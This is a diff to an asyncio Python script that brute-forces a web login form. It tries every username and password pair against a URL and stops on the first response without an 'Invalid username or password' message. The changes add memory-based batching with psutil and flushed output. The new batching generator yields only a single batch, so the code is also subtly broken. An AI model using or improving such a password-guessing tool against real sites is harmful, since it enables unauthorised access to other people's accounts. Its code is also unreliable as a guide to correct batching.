@@ -12,10 +12,15 @@ import asyncio
 from functools import wraps
 import logging
 import timeit
+import psutil
+import itertools
 
-logger = logging.getLogger()
+logger = logging.getLogger(logging.basicConfig(level=logging.INFO))
 
-logging.basicConfig(level=logging.DEBUG)
+MEM_USAGE = 0.8
+MEMORY = psutil.virtual_memory().free * MEM_USAGE
+logger.info("Using %s of free memory (%s bytes)", MEM_USAGE, MEMORY)
+
 
 def coroutine(f):
     @wraps(f)
@@ -33,14 +38,17 @@ def coroutine(f):
 async def crack(url:str, user_list:Path, password_list:Path, threads:int):
     myconn = aiohttp.TCPConnector()
     async with ClientSession(connector=myconn) as session:
-        tasks = []
-        for data in permutations(user_list, password_list):
-            task = asyncio.ensure_future(post_and_check(url, data, session))
-            tasks.append(task)
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-    for result in results:
-        if isinstance(result, Exception):
-            raise result
+        for batch in batched_tasks((asyncio.ensure_future(post_and_check(url, data, session)) for data in permutations(user_list, password_list)), MEMORY):
+            results = await asyncio.gather(*batch, return_exceptions=True)
+            for result in results:
+                if isinstance(result, Exception):
+                    raise result
+
+def batched_tasks(genexpr, memory):
+    probe_element = next(genexpr)
+    batch_size = int(memory / sys.getsizeof(probe_element))
+    logger.info("Using batch size of %s", batch_size)
+    yield [probe_element] + list(itertools.islice(genexpr, batch_size))
     
 
 def permutations(user_list, password_list):
@@ -56,9 +64,9 @@ async def post_and_check(url, data, session:ClientSession):
     async with session.post(url, data=data) as response:
         result = await response.text()
         if "Invalid username or password" in result:
-            print(f"Unsuccessful login for {data}")
+            print(f"Unsuccessful login for {data}", flush=True)
         else:
-            print(f"Successful login for {data}")
+            print(f"Successful login for {data}", flush=True)
             sys.exit(0)
     
 
